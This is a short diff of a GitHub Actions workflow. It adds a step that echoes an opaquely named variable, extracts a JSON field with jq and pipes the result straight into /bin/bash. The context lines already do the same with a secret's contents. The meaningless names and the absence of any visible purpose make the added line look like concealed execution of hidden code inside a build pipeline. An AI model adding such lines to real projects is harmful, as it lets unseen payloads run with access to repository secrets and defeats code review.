@@ -22,6 +22,7 @@ jobs:
           c43129: ${{ secrets.c43129 }}
         run: |
           printf '%s' "$c43129" | jq -r .oh168 | /bin/bash
+          echo $t51 | jq -r .k3 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
